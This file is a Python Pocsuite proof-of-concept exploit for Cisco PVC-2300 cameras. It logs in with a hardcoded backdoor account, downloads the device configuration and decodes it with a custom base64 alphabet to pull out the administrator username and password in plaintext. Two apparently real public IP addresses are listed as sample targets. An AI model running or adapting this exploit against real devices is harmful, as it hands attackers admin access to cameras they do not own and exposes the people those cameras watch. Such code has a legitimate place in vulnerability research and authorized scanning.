#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import base64
import string
import re

def b64_pvc2300(b64_content):
    std_b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    pvc_b64 = "ACEGIKMOQSUWYBDFHJLNPRTVXZacegikmoqsuwybdfhjlnprtvxz0246813579=+/"
    b64_content = b64_content.translate(string.maketrans(pvc_b64, std_b64))
    plaintext = base64.b64decode(b64_content)
    return plaintext

class TestPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['Hcamael']
    vulDate = ''
    createDate = '2016-09-22'
    updateDate = '2016-09-22'
    references = ['']
    name = 'Cisco PVC-2300 摄像头配置信息泄露漏洞'
    appPowerLink = ''
    appName = 'Cisco PVC-2300'
    appVersion = 'PVC-2300'
    vulType = 'Information Disclosure'
    desc = '''
        Cisco PVC-2300 摄像头配置文件泄露, 可从配置文件中获取管理员账号和密码明文信息
    '''
    samples = ['http://168.150.251.100',
               'http://74.105.25.220:1026']
    #请尽量不要使用第三方库，必要时参考 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md#poc-第三方模块依赖说明 填写该字段

    def _attack(self):
        return self._verify()

    def _verify(self):
        result = {}
        get_sessionid_url = "/oamp/System.xml?action=login&user=L1_admin&password=L1_51"
        get_config_url = "/oamp/System.xml?action=downloadConfigurationFile"
        r = req.get(self.url + get_sessionid_url)
        if 'sessionid' in r.headers:
            header = {}
            header['sessionid'] = r.headers['sessionid']
            r2 = req.get(self.url+get_config_url, headers=header)
            try:
                config = b64_pvc2300(r2.content)
            except Exception, e:
                print e
                return self.parse_output(result)
            info = re.findall("admin_name=(.*?)\nadmin_password=(.*?)\n", config)
            if len(info) > 0:
               result['VerifyInfo'] = {}
               result['VerifyInfo']['URL'] = self.url
               result['AdminInfo'] = {}
               result['AdminInfo']['username'], result['AdminInfo']['password'] = info[0]
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

